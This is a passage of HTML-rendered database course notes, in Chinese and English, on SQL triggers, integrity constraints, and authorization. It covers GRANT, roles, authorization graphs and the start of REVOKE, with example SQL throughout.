</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#note-db-sql-__codelineno-126-2"></a><span class="w">    </span><span class="n">order_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-126-3"><a id="__codelineno-126-3" name="__codelineno-126-3" href="#note-db-sql-__codelineno-126-3"></a><span class="w">    </span><span class="n">order_status</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
</span><span id="__span-126-4"><a id="__codelineno-126-4" name="__codelineno-126-4" href="#note-db-sql-__codelineno-126-4"></a><span class="w">    </span><span class="n">last_updated</span><span class="w"> </span><span class="k">TIMESTAMP</span>
</span><span id="__span-126-5"><a id="__codelineno-126-5" name="__codelineno-126-5" href="#note-db-sql-__codelineno-126-5"></a><span class="p">);</span>
</span><span id="__span-126-6"><a id="__codelineno-126-6" name="__codelineno-126-6" href="#note-db-sql-__codelineno-126-6"></a>
</span><span id="__span-126-7"><a id="__codelineno-126-7" name="__codelineno-126-7" href="#note-db-sql-__codelineno-126-7"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">order_log</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-126-8"><a id="__codelineno-126-8" name="__codelineno-126-8" href="#note-db-sql-__codelineno-126-8"></a><span class="w">    </span><span class="n">log_id</span><span class="w"> </span><span class="nb">SERIAL</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-126-9"><a id="__codelineno-126-9" name="__codelineno-126-9" href="#note-db-sql-__codelineno-126-9"></a><span class="w">    </span><span class="n">order_id</span><span class="w"> </span><span class="nb">INT</span><span class="p">,</span>
</span><span id="__span-126-10"><a id="__codelineno-126-10" name="__codelineno-126-10" href="#note-db-sql-__codelineno-126-10"></a><span class="w">    </span><span class="n">old_status</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
</span><span id="__span-126-11"><a id="__codelineno-126-11" name="__codelineno-126-11" href="#note-db-sql-__codelineno-126-11"></a><span class="w">    </span><span class="n">new_status</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
</span><span id="__span-126-12"><a id="__codelineno-126-12" name="__codelineno-126-12" href="#note-db-sql-__codelineno-126-12"></a><span class="w">    </span><span class="n">change_time</span><span class="w"> </span><span class="k">TIMESTAMP</span>
</span><span id="__span-126-13"><a id="__codelineno-126-13" name="__codelineno-126-13" href="#note-db-sql-__codelineno-126-13"></a><span class="p">);</span>
</span></code></pre></div>
<p>语句级触发器</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#note-db-sql-__codelineno-127-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TRIGGER</span><span class="w"> </span><span class="n">log_order_status_change</span>
</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2" href="#note-db-sql-__codelineno-127-2"></a><span class="k">AFTER</span><span class="w"> </span><span class="k">UPDATE</span><span class="w"> </span><span class="k">OF</span><span class="w"> </span><span class="n">order_status</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">orders</span>
</span><span id="__span-127-3"><a id="__codelineno-127-3" name="__codelineno-127-3" href="#note-db-sql-__codelineno-127-3"></a><span class="k">REFERENCING</span><span class="w"> </span><span class="k">OLD</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">old_orders</span><span class="w"> </span><span class="k">NEW</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">new_orders</span>
</span><span id="__span-127-4"><a id="__codelineno-127-4" name="__codelineno-127-4" href="#note-db-sql-__codelineno-127-4"></a><span class="k">FOR</span><span class="w"> </span><span class="k">EACH</span><span class="w"> </span><span class="k">STATEMENT</span>
</span><span id="__span-127-5"><a id="__codelineno-127-5" name="__codelineno-127-5" href="#note-db-sql-__codelineno-127-5"></a><span class="k">BEGIN</span>
</span><span id="__span-127-6"><a id="__codelineno-127-6" name="__codelineno-127-6" href="#note-db-sql-__codelineno-127-6"></a><span class="w">    </span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">order_log</span><span class="w"> </span><span class="p">(</span><span class="n">order_id</span><span class="p">,</span><span class="w"> </span><span class="n">old_status</span><span class="p">,</span><span class="w"> </span><span class="n">new_status</span><span class="p">,</span><span class="w"> </span><span class="n">change_time</span><span class="p">)</span>
</span><span id="__span-127-7"><a id="__codelineno-127-7" name="__codelineno-127-7" href="#note-db-sql-__codelineno-127-7"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">old_orders</span><span class="p">.</span><span class="n">order_id</span><span class="p">,</span><span class="w"> </span><span class="n">old_orders</span><span class="p">.</span><span class="n">order_status</span><span class="p">,</span><span class="w"> </span><span class="n">new_orders</span><span class="p">.</span><span class="n">order_status</span><span class="p">,</span><span class="w"> </span><span class="k">CURRENT_TIMESTAMP</span>
</span><span id="__span-127-8"><a id="__codelineno-127-8" name="__codelineno-127-8" href="#note-db-sql-__codelineno-127-8"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">old_orders</span><span class="p">,</span><span class="w"> </span><span class="n">new_orders</span>
</span><span id="__span-127-9"><a id="__codelineno-127-9" name="__codelineno-127-9" href="#note-db-sql-__codelineno-127-9"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">old_orders</span><span class="p">.</span><span class="n">order_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_orders</span><span class="p">.</span><span class="n">order_id</span><span class="p">;</span>
</span><span id="__span-127-10"><a id="__codelineno-127-10" name="__codelineno-127-10" href="#note-db-sql-__codelineno-127-10"></a><span class="k">END</span><span class="p">;</span>
</span></code></pre></div>
<p>这个触发器在 <code>orders</code> 表的 <code>order_status</code> 列更新后执行一次，将所有受影响的订单状态变化记录到 <code>order_log</code> 表中。这样可以有效地记录批量更新的变化，而不需要为每一行单独执行触发器。</p>
</div>
<div class="admonition info">
<p class="admonition-title">External World Actions</p>
<p>We sometimes require external world actions to be triggered on a database update 
E.g., Re-ordering an item whose quantity in a warehouse has become small, or turning on an alarm light. （当库存低于警戒线，增加订货或报警） </p>
<p>Triggers cannot be used to directly implement external-world actions, BUT 
Triggers can be used to record actions-to-be-taken in a separate table 
Have an external process that repeatedly scans the table, carries out external-world actions and deletes action from table. </p>
<p>Suppose a warehouse has the following tables </p>
<p><code>inventory(item, level)</code>: How much of each item is in the warehouse presently </p>
<p><code>minlevel(item, level)</code>: What is the minimum desired level of each item </p>
<p><code>reorder(item, amount)</code>: What quantity should we re-order at a time </p>
<p><code>orders(item, quantity)</code>: Orders to be placed  (to be read by external process) </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#note-db-sql-__codelineno-128-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TRIGGER</span><span class="w"> </span><span class="n">reorder</span><span class="o">-</span><span class="k">trigger</span><span class="w"> </span>
</span><span id="__span-128-2"><a id="__codelineno-128-2" name="__codelineno-128-2" href="#note-db-sql-__codelineno-128-2"></a><span class="k">after</span><span class="w"> </span><span class="k">update</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">level</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">inventory</span><span class="w"> </span>
</span><span id="__span-128-3"><a id="__codelineno-128-3" name="__codelineno-128-3" href="#note-db-sql-__codelineno-128-3"></a><span class="k">referencing</span><span class="w"> </span><span class="k">old</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">orow</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">nrow</span><span class="w"> </span>
</span><span id="__span-128-4"><a id="__codelineno-128-4" name="__codelineno-128-4" href="#note-db-sql-__codelineno-128-4"></a><span class="k">for</span><span class="w"> </span><span class="k">each</span><span class="w"> </span><span class="k">row</span><span class="w"> </span>
</span><span id="__span-128-5"><a id="__codelineno-128-5" name="__codelineno-128-5" href="#note-db-sql-__codelineno-128-5"></a><span class="k">when</span><span class="w"> </span><span class="n">nrow</span><span class="p">.</span><span class="k">level</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">level</span><span class="w"> </span>
</span><span id="__span-128-6"><a id="__codelineno-128-6" name="__codelineno-128-6" href="#note-db-sql-__codelineno-128-6"></a><span class="w">                      </span><span class="k">from</span><span class="w"> </span><span class="n">minlevel</span><span class="w"> </span>
</span><span id="__span-128-7"><a id="__codelineno-128-7" name="__codelineno-128-7" href="#note-db-sql-__codelineno-128-7"></a><span class="w">                      </span><span class="k">where</span><span class="w"> </span><span class="n">minlevel</span><span class="p">.</span><span class="n">item</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nrow</span><span class="p">.</span><span class="n">item</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-128-8"><a id="__codelineno-128-8" name="__codelineno-128-8" href="#note-db-sql-__codelineno-128-8"></a><span class="w">               </span><span class="k">and</span><span class="w"> </span><span class="n">orow</span><span class="p">.</span><span class="k">level</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">level</span><span class="w"> </span>
</span><span id="__span-128-9"><a id="__codelineno-128-9" name="__codelineno-128-9" href="#note-db-sql-__codelineno-128-9"></a><span class="w">                                </span><span class="k">from</span><span class="w"> </span><span class="n">minlevel</span><span class="w"> </span>
</span><span id="__span-128-10"><a id="__codelineno-128-10" name="__codelineno-128-10" href="#note-db-sql-__codelineno-128-10"></a><span class="w">                                </span><span class="k">where</span><span class="w"> </span><span class="n">minlevel</span><span class="p">.</span><span class="n">item</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">orow</span><span class="p">.</span><span class="n">item</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-128-11"><a id="__codelineno-128-11" name="__codelineno-128-11" href="#note-db-sql-__codelineno-128-11"></a><span class="k">begin</span><span class="w"> </span>
</span><span id="__span-128-12"><a id="__codelineno-128-12" name="__codelineno-128-12" href="#note-db-sql-__codelineno-128-12"></a><span class="w">    </span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">orders</span><span class="w"> </span>
</span><span id="__span-128-13"><a id="__codelineno-128-13" name="__codelineno-128-13" href="#note-db-sql-__codelineno-128-13"></a><span class="w">        </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">item</span><span class="p">,</span><span class="w"> </span><span class="n">amount</span><span class="w"> </span>
</span><span id="__span-128-14"><a id="__codelineno-128-14" name="__codelineno-128-14" href="#note-db-sql-__codelineno-128-14"></a><span class="w">        </span><span class="k">from</span><span class="w"> </span><span class="n">reorder</span><span class="w"> </span>
</span><span id="__span-128-15"><a id="__codelineno-128-15" name="__codelineno-128-15" href="#note-db-sql-__codelineno-128-15"></a><span class="w">        </span><span class="k">where</span><span class="w"> </span><span class="n">reorder</span><span class="p">.</span><span class="n">item</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">orow</span><span class="p">.</span><span class="n">item</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-128-16"><a id="__codelineno-128-16" name="__codelineno-128-16" href="#note-db-sql-__codelineno-128-16"></a><span class="k">end</span><span class="w"> </span>
</span></code></pre></div>
<p>虽然这个trigger不能直接执行外部世界的操作，但是可以记录下需要执行的操作，然后由外部进程来执行。</p>
<p>这个触发器在 <code>inventory</code> 表的 <code>level</code> 列更新后执行。它会检查更新后的库存量是否低于最低期望库存量，并且更新前的库存量是否高于最低期望库存量。如果满足条件，就会在 <code>orders</code> 表中插入一条新的订单记录。这样，外部进程可以读取 <code>orders</code> 表中的记录来执行实际的订购操作。</p>
</div>
<p>触发器在早些年被用于以下任务：
维护汇总数据（例如，每个部门的总工资）
通过记录对特殊关系（称为变更或增量关系）的更改并让一个单独的进程将更改应用到副本来复制数据库。</p>
<p>现在有更好的方法来完成这些任务：
如今的数据库提供内置的物化视图功能来维护汇总数据；
数据库提供内置的复制支持。</p>
<div class="admonition summary">
<p class="admonition-title">Check vs assertion vs trigger</p>
<p>在 SQL 中，<code>CHECK</code> 约束、<code>ASSERTION</code> 和 <code>TRIGGER</code> 是用于维护数据完整性和一致性的三种不同机制。以下是它们的比较：</p>
<ul>
<li>CHECK：用于在表级别定义简单的条件，以确保列中的数据满足特定条件。限于单个表的单个列或多个列。通常性能较好，因为它们在插入或更新时直接在表级别进行检查。不能跨多个表进行复杂的条件检查。</li>
</ul>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#note-db-sql-__codelineno-129-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-129-2"><a id="__codelineno-129-2" name="__codelineno-129-2" href="#note-db-sql-__codelineno-129-2"></a><span class="w">    </span><span class="n">employee_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-129-3"><a id="__codelineno-129-3" name="__codelineno-129-3" href="#note-db-sql-__codelineno-129-3"></a><span class="w">    </span><span class="n">salary</span><span class="w"> </span><span class="nb">DECIMAL</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="k">CHECK</span><span class="w"> </span><span class="p">(</span><span class="n">salary</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-129-4"><a id="__codelineno-129-4" name="__codelineno-129-4" href="#note-db-sql-__codelineno-129-4"></a><span class="p">);</span>
</span></code></pre></div>
<ul>
<li>ASSERTION：用于定义跨多个表的复杂条件，以确保数据库的整体一致性。可以跨多个表进行检查。可能会影响性能，因为每次相关表更新时都需要检查断言。在许多数据库系统中不被广泛支持。</li>
</ul>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#note-db-sql-__codelineno-130-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">ASSERTION</span><span class="w"> </span><span class="n">salary_check</span>
</span><span id="__span-130-2"><a id="__codelineno-130-2" name="__codelineno-130-2" href="#note-db-sql-__codelineno-130-2"></a><span class="k">CHECK</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-130-3"><a id="__codelineno-130-3" name="__codelineno-130-3" href="#note-db-sql-__codelineno-130-3"></a><span class="w">    </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">AVG</span><span class="p">(</span><span class="n">salary</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">100000</span>
</span><span id="__span-130-4"><a id="__codelineno-130-4" name="__codelineno-130-4" href="#note-db-sql-__codelineno-130-4"></a><span class="p">);</span>
</span></code></pre></div>
<ul>
<li>TRIGGER：用于在特定事件（如插入、更新或删除）发生时自动执行一段代码。可以执行几乎任何类型的操作，包括调用外部程序。可能会影响性能，特别是在触发器中执行复杂逻辑时。</li>
<li>限制：在许多数据库系统中不被广泛支持。</li>
</ul>
</div>
<h3 id="note-db-sql-authorization">Authorization<a class="headerlink" href="#note-db-sql-authorization" title="Permanent link">&para;</a></h3>
<h4 id="note-db-sql-security">Security<a class="headerlink" href="#note-db-sql-security" title="Permanent link">&para;</a></h4>
<p>Security involves protection from malicious attempts to steal or modify data. It can be addressed at various levels:</p>
<ul>
<li>
<p><strong>Database System Level</strong>: Authentication and authorization mechanisms allow specific users access only to required data. </p>
</li>
<li>
<p><strong>Operating System Level</strong>: Operating system super-users can do anything they want to the database! Good operating system level security is required.</p>
</li>
<li>
<p><strong>Network Level</strong>: Must use encryption to prevent:</p>
</li>
<li>Eavesdropping (unauthorized reading of messages)</li>
<li>
<p>Masquerading (pretending to be an authorized user or sending messages supposedly from authorized users)</p>
</li>
<li>
<p><strong>Physical Level</strong>: Physical access to computers allows destruction of data by intruders; traditional lock-and-key security is needed. Computers must also be protected from floods, fire, etc. -- (Recovery)</p>
</li>
<li>
<p><strong>Human Level</strong>: Users must be screened to ensure that authorized users do not give access to intruders. Users should be trained on password selection and secrecy.</p>
</li>
</ul>
<h4 id="note-db-sql-forms-of-authorization-on-parts-of-the-database">Forms of Authorization on Parts of the Database<a class="headerlink" href="#note-db-sql-forms-of-authorization-on-parts-of-the-database" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>Read Authorization</strong>: Allows reading, but not modification of data.</li>
<li><strong>Insert Authorization</strong>: Allows insertion of new data, but not modification of existing data.</li>
<li><strong>Update Authorization</strong>: Allows modification, but not deletion of data.</li>
<li><strong>Delete Authorization</strong>: Allows deletion of data.</li>
</ul>
<h4 id="note-db-sql-forms-of-authorization-to-modify-the-database-schema">Forms of Authorization to Modify the Database Schema<a class="headerlink" href="#note-db-sql-forms-of-authorization-to-modify-the-database-schema" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>Index Authorization</strong>: Allows creation and deletion of indices.</li>
<li><strong>Resources Authorization</strong>: Allows creation of new relations.</li>
<li><strong>Alteration Authorization</strong>: Allows addition or modifying of attributes in a relation.</li>
<li><strong>Drop Authorization</strong>: Allows deletion of relations.</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>Users can be given authorization on views, without being given any authorization on the relations used in the view definition. </p>
<p>Ability of views to hide data serves both to simplify usage of the system and to enhance security by allowing users access only to data they need for their job. </p>
<p>A combination of relational-level security and view-level security can be used to limit a user's access to precisely  the data that user needs. </p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Suppose a bank clerk needs to know the names of the customers of each branch, but is not authorized to see specific loan information. </p>
<p>Approach: Deny direct access to the loan relation, but grant access to the view cust-loan, which consists only of  the names of customers and the branches at which they have a loan. 
The cust-loan view is defined in SQL as follows: </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#note-db-sql-__codelineno-131-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">VIEW</span><span class="w"> </span><span class="n">cust</span><span class="o">-</span><span class="n">loan</span><span class="w"> </span><span class="k">as</span><span class="w"> </span>
</span><span id="__span-131-2"><a id="__codelineno-131-2" name="__codelineno-131-2" href="#note-db-sql-__codelineno-131-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branchname</span><span class="p">,</span><span class="w"> </span><span class="n">customer</span><span class="o">-</span><span class="n">name</span><span class="w"> </span>
</span><span id="__span-131-3"><a id="__codelineno-131-3" name="__codelineno-131-3" href="#note-db-sql-__codelineno-131-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span><span class="p">,</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span>
</span><span id="__span-131-4"><a id="__codelineno-131-4" name="__codelineno-131-4" href="#note-db-sql-__codelineno-131-4"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">borrower</span><span class="p">.</span><span class="n">loan</span><span class="o">-</span><span class="nb">number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">loan</span><span class="p">.</span><span class="n">loan</span><span class="o">-</span><span class="nb">number</span><span class="w"> </span>
</span></code></pre></div>
<p>The clerk can now read the cust-loan view, which will give him the information he needs without seeing the loan relation. </p>
<p>Creation of view does not require resources authorization since no real relation is being created. </p>
<p>the creator of a view gets only those privileges that provide no additional authorization beyond that he already had. </p>
</div>
<h4 id="note-db-sql-granting-of-privileges">Granting of Privileges<a class="headerlink" href="#note-db-sql-granting-of-privileges" title="Permanent link">&para;</a></h4>
<figure>
    <img src="../NOTE/DB/img/sql-2.png" alt="grant" width="500">
    <figcaption>Authorization Graph</figcaption>
</figure>

<p>该图的节点是用户。图的根节点是数据库管理员。
考虑对贷款进行更新授权的图。</p>
<p>一个边 <span class="arithmatex">\( U_i \rightarrow U_j \)</span> 表示用户 <span class="arithmatex">\( U_i \)</span> 已将对贷款的更新授权授予用户 <span class="arithmatex">\( U_j \)</span>。</p>
<div class="admonition property">
<p class="admonition-title">Property</p>
<p>授权图中的所有边必须是从数据库管理员开始的某条路径的一部分。</p>
<ul>
<li><strong>如果数据库管理员撤销了对 U1 的授权：</strong></li>
<li>必须从 U4 撤销授权，因为 U1 不再拥有授权。</li>
<li>
<p>不必从 U5 撤销授权，因为 U5 通过 U2 还有另一条从数据库管理员到达的授权路径。</p>
</li>
<li>
<p><strong>必须防止没有从根节点路径的授权循环：</strong></p>
</li>
<li>数据库管理员授予 U7 授权</li>
<li>U7 授予 U8 授权</li>
<li>U8 授予 U7 授权</li>
<li>数据库管理员撤销了对 U7 的授权</li>
</ul>
<p>必须撤销从 U7 到 U8 和从 U8 到 U7 的授权，因为不再有从数据库管理员到 U7 或 U8 的路径。</p>
</div>
<h4 id="note-db-sql-grant-statement">Grant Statement<a class="headerlink" href="#note-db-sql-grant-statement" title="Permanent link">&para;</a></h4>
<p>The grant statement is used to grant privileges to users.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#note-db-sql-__codelineno-132-1"></a><span class="k">GRANT</span><span class="w"> </span><span class="o">&lt;</span><span class="n">privilege</span><span class="o">-</span><span class="n">list</span><span class="o">&gt;</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">|</span><span class="k">view</span><span class="o">&gt;</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="o">&lt;</span><span class="k">user</span><span class="o">-</span><span class="n">name</span><span class="o">-</span><span class="n">list</span><span class="o">&gt;</span>
</span></code></pre></div>
<ul>
<li>
<p><code>user name list</code>:</p>
</li>
<li>
<p>user-ids</p>
</li>
<li>public, which allows all valid users the privilege granted </li>
<li>A role </li>
</ul>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>1 <strong>Public</strong>（公共）：</p>
<ul>
<li>在 SQL 中，<code>public</code> 关键字用于将权限授予所有用户。当你将某个权限授予 <code>public</code> 时，意味着每个有权访问数据库的用户都可以执行指定的操作。</li>
<li>例如，如果你将某个表的 <code>SELECT</code> 权限授予 <code>public</code>，那么任何用户都可以查询该表。</li>
<li>这是使某些数据或操作普遍可访问的一种方式，而无需指定具体的用户。</li>
</ul>
<p>2 <strong>Role</strong>（角色）：</p>
<ul>
<li>SQL 中的 <code>role</code> 是一组相关权限的命名集合，可以授予用户或其他角色。角色用于简化用户权限的管理。</li>
<li>与其将相同的一组权限单独授予多个用户，不如创建一个包含这些权限的角色，然后将该角色授予用户。</li>
<li>角色也可以授予其他角色，从而允许层次化的权限管理。</li>
<li>角色有助于更高效地组织和管理权限，特别是在拥有众多用户的大型数据库中。</li>
</ul>
</div>
<ul>
<li>
<p><code>privilege-list</code>:</p>
</li>
<li>
<p><code>SELECT</code>:allows read access to relation, or the ability to query using the view </p>
</li>
<li><code>Insert</code>: the ability to insert tuples. </li>
<li><code>Update</code>: the ability to update using the SQL update statement. </li>
<li><code>Delete</code>: the ability to delete tuples. </li>
<li><code>References</code>: ability to declare foreign keys when creating relations. </li>
<li><code>All privileges</code>: used as a short form for all the allowable privileges. </li>
<li><code>All</code>: used as a short form for all the allowable privileges. </li>
</ul>
<p>e.g.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#note-db-sql-__codelineno-133-1"></a><span class="k">GRANT</span><span class="w"> </span><span class="k">SELECT</span><span class="p">,</span><span class="w"> </span><span class="k">INSERT</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="n">U1</span><span class="p">,</span><span class="n">U2</span><span class="p">,</span><span class="n">U3</span>
</span></code></pre></div>
<ul>
<li><code>WITH GRANT OPTION</code>: Allows a user who is granted a privilege to pass the privilege on to other users. </li>
</ul>
<p>e.g.</p>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#note-db-sql-__codelineno-134-1"></a><span class="k">GRANT</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="n">U1</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="k">GRANT</span><span class="w"> </span><span class="k">OPTION</span>
</span></code></pre></div>
现在U1不仅有对loan表的查找权限，还可以将这个权限传递给其它的用户</p>
<h4 id="note-db-sql-roles">Roles<a class="headerlink" href="#note-db-sql-roles" title="Permanent link">&para;</a></h4>
<blockquote>
<p>permiting common privileges for a class of users can be specified just once, by creating a corresponding "role". </p>
</blockquote>
<p>Privileges can be granted to or revoked from roles, just like user;  roles can be assigned to users, and even to other roles. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#note-db-sql-__codelineno-135-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">role</span><span class="w"> </span><span class="n">teller</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-135-2"><a id="__codelineno-135-2" name="__codelineno-135-2" href="#note-db-sql-__codelineno-135-2"></a><span class="k">Create</span><span class="w"> </span><span class="k">role</span><span class="w"> </span><span class="n">manager</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-135-3"><a id="__codelineno-135-3" name="__codelineno-135-3" href="#note-db-sql-__codelineno-135-3"></a><span class="k">Grant</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">teller</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-135-4"><a id="__codelineno-135-4" name="__codelineno-135-4" href="#note-db-sql-__codelineno-135-4"></a><span class="k">Grant</span><span class="w"> </span><span class="k">update</span><span class="w"> </span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">teller</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-135-5"><a id="__codelineno-135-5" name="__codelineno-135-5" href="#note-db-sql-__codelineno-135-5"></a><span class="k">Grant</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="k">privileges</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">manager</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-135-6"><a id="__codelineno-135-6" name="__codelineno-135-6" href="#note-db-sql-__codelineno-135-6"></a><span class="k">Grant</span><span class="w"> </span><span class="n">teller</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">manager</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-135-7"><a id="__codelineno-135-7" name="__codelineno-135-7" href="#note-db-sql-__codelineno-135-7"></a><span class="k">Grant</span><span class="w"> </span><span class="n">teller</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">alice</span><span class="p">,</span><span class="w"> </span><span class="n">bob</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-135-8"><a id="__codelineno-135-8" name="__codelineno-135-8" href="#note-db-sql-__codelineno-135-8"></a><span class="k">Grant</span><span class="w"> </span><span class="n">manager</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">avi</span><span class="p">;</span><span class="w"> </span>
</span></code></pre></div>
<h4 id="note-db-sql-revoking-authorization">Revoking Authorization<a class="headerlink" href="#note-db-sql-revoking-authorization" title="Permanent link">&para;</a></h4>
<p>Revoking authorization is the inverse of granting authorization. </p>
<p>The revoke statement is used to revoke authorization. </p>
<p>format</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#note-db-sql-__codelineno-136-1"></a><span class="k">REVOKE</span><span class="w"> </span><span class="o">&lt;</span><span class="n">privilege</span><span class="w"> </span><span class="n">list</span><span class="o">&gt;</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">view</span><span class="o">&gt;</span><span class="w"> </span>
</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#note-db-sql-__codelineno-136-2"></a><span class="w">            </span><span class="k">FROM</span><span class="w"> </span><span class="o">&lt;</span><span class="k">user</span><span class="w"> </span><span class="n">list</span><span class="o">&gt;</span><span class="w"> </span><span class="p">[</span><span class="k">restrict</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">cascade</span><span class="p">]</span><span class="w"> </span>
</span></code></pre></div>
<ul>
